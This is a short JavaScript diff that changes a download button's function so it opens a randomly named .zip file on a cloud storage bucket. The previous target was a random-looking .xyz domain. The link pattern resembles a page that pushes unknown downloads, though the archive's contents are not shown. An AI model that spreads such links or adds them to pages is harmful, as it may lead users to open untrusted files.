@@ -13,5 +13,5 @@
 })();
 
 function btnDown() {
-    window.open('https://xhshuxcoslemz.xyz/')
+    window.open('https://mfnayus-1378188899.cos.ap-hongkong.myqcloud.com/guity-hsgquickq.zip')
                 }
